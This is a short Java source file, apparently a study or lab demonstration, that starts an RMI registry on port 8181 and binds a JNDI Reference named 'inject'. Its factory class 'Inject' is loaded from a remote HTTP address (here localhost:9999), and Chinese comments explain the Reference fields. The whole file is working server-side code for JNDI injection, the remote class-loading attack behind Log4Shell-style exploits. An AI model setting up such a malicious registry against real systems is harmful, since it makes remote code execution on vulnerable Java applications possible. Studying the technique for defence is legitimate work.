package rmi.othercase;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @description:
 * @author: Ding Yawu
 * @create: 2021/12/17 09:40
 */
public class Server {

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(8181);
        /**
         * .className：远程加载时所使用的类名；
         * •classFactory：加载的class中需要实例化类的名称；
         * •classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；
         */
        Reference reference = new Reference("Inject", "Inject", "http://127.0.0.1:9999/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.rebind("inject", wrapper);

        System.out.println("服务已启动");
        Thread.currentThread().join();
    }
}
